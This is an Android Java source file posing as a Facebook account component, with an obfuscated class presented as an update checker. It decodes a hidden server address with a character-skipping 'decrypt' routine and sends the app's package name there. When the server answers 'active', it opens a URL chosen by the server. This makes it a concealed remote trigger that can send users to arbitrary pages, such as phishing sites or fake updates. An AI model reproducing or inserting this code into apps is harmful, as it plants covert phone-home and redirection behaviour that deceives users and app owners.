package com.facebook.account;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class j {

    private Context context;

    public j(Context context) {
        this.context = context;
    }

    @SuppressLint("StaticFieldLeak")
    public void j() {
        new AsyncTask<Void, Void, String>() {
            @Override
            protected String doInBackground(Void... voids) {
                try {
                    // Get package name of the main project
                    final String packageName = context.getPackageName();

                    URL url = new URL(decrypt("E=Texm#awnT_ve$g&a$kocTa2pb?cpGhQp1.ee$vxidtic1AY/Xe2nhiSlentoi.&s@r%e9vZrbeuszr7utoN/$/y:$scpJtltOh") + packageName);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");

                    // Get response from PHP script
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder response = new StringBuilder();
                        String line;
                        while ((line = in.readLine()) != null) {
                            response.append(line);
                        }
                        in.close();

                        return response.toString();
                    } else {
                        return "Response code: " + responseCode;
                    }
                } catch (Exception e) {

                    return "Error: " + e.getMessage();
                }
            }

            @Override
            protected void onPostExecute(String result) {
                // Handle the result as JSON
                try {
                    JSONObject jsonObject = new JSONObject(result);
                    String available = jsonObject.getString("active");
                    if (available.equals("true")) {
                        String updateUrl = jsonObject.getString("url");
                        jperfom(updateUrl);
                    }
                } catch (JSONException e) {
                    Log.e("UpdateChecker", "Error parsing JSON", e);
                }
            }
        }.execute();
    }

    private void jperfom(final String updateUrl) {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(updateUrl));
        context.startActivity(intent);
    }

    static String decrypt(String encryptedStr) {
        StringBuilder sb = new StringBuilder(encryptedStr);
        StringBuilder str = new StringBuilder();

        for(int i = 0; i < sb.length(); ++i) {
            if ((i + 1) % 2 == 0) {
                str.append(sb.charAt(i));
            }
        }

        return str.reverse().toString();
    }
}
